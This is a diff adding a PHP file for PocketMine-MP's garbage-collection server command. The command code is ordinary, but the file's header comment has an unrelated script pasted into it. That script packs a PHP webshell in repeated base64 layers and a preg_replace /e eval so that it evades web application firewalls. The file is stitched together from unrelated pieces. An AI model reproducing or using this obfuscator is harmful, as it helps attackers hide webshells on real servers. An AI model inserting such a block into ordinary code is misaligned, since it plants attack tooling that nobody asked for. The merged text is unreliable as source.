@@ -1,0 +1,117 @@
+<?php
+
+/*
+<?php
+	/*
+	 * Author: Laterain
+	 * Time: 20130820
+	 * About: Confusion to encrypt php webshell, Bypass the WAF
+	 */
+	 
+	if ($argc < 4) {
+		echo " ____ \r\n";                           
+		echo "| __ ) _   _ _ __   __ _ ___ ___ \r\n";
+		echo "|  _ \| | | | '_ \ / _` / __/ __|\r\n";
+		echo "| |_) | |_| | |_) | (_| \__ \__ \\\r\n";
+		echo "|____/ \__, | .__/ \__,_|___/___/\r\n";
+        echo "       |___/|_| \r\n\r\n";
+		echo "#usage: php $argv[0] webshell EncodeTimes outputfile\r\n";
+		echo "#E x p: php $argv[0] phpspy.php 1 nokill.php\r\n";
+		echo "#T i p: More EncodeTimes less speed!\r\n";
+		exit;
+	}
+	
+	if ($argv[2] < 1) {
+		echo "Must >= 1 !\r\n";
+		exit;
+	}
+	$source = $argv[1];
+	$output = $argv[3];
+	$source = php_strip_whitespace($source);
+	$source = trim(trim(trim($source, '<?php'),'<?'),'?>');
+	
+	$shellcode = '$code';
+	for ($i = 0; $i < $argv[2]; ++$i) {
+		$source = base64_encode($source);
+		$shellcode = 'base64_decode('.$shellcode.')';
+	}
+	
+	$shellcode = 'preg_replace(base64_decode(\'L2EvZQ==\'),base64_decode(\''.base64_encode('eval('.$shellcode.')').'\'),\'a\')';
+	$shellcode = '<?php $code=\''.$source.'\';'."\r\n\r\n".$shellcode.'; ?>';
+	
+	fwrite(fopen($output, 'w'), $shellcode);
+	echo "\r\nSuccess!\r\n"
+?>
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\command\defaults;
+
+use pocketmine\command\CommandSender;
+use pocketmine\utils\TextFormat;
+use function count;
+use function memory_get_usage;
+use function number_format;
+use function round;
+
+class GarbageCollectorCommand extends VanillaCommand{
+
+	public function __construct(string $name){
+		parent::__construct(
+			$name,
+			"%pocketmine.command.gc.description",
+			"%pocketmine.command.gc.usage"
+		);
+		$this->setPermission("pocketmine.command.gc");
+	}
+
+	public function execute(CommandSender $sender, string $commandLabel, array $args){
+		if(!$this->testPermission($sender)){
+			return true;
+		}
+
+		$chunksCollected = 0;
+		$entitiesCollected = 0;
+		$tilesCollected = 0;
+
+		$memory = memory_get_usage();
+
+		foreach($sender->getServer()->getLevels() as $level){
+			$diff = [count($level->getChunks()), count($level->getEntities()), count($level->getTiles())];
+			$level->doChunkGarbageCollection();
+			$level->unloadChunks(true);
+			$chunksCollected += $diff[0] - count($level->getChunks());
+			$entitiesCollected += $diff[1] - count($level->getEntities());
+			$tilesCollected += $diff[2] - count($level->getTiles());
+			$level->clearCache(true);
+		}
+
+		$cyclesCollected = $sender->getServer()->getMemoryManager()->triggerGarbageCollector();
+
+		$sender->sendMessage(TextFormat::GREEN . "---- " . TextFormat::WHITE . "Garbage collection result" . TextFormat::GREEN . " ----");
+		$sender->sendMessage(TextFormat::GOLD . "Chunks: " . TextFormat::RED . number_format($chunksCollected));
+		$sender->sendMessage(TextFormat::GOLD . "Entities: " . TextFormat::RED . number_format($entitiesCollected));
+		$sender->sendMessage(TextFormat::GOLD . "Tiles: " . TextFormat::RED . number_format($tilesCollected));
+
+		$sender->sendMessage(TextFormat::GOLD . "Cycles: " . TextFormat::RED . number_format($cyclesCollected));
+		$sender->sendMessage(TextFormat::GOLD . "Memory freed: " . TextFormat::RED . number_format(round((($memory - memory_get_usage()) / 1024) / 1024, 2), 2) . " MB");
+		return true;
+	}
+}
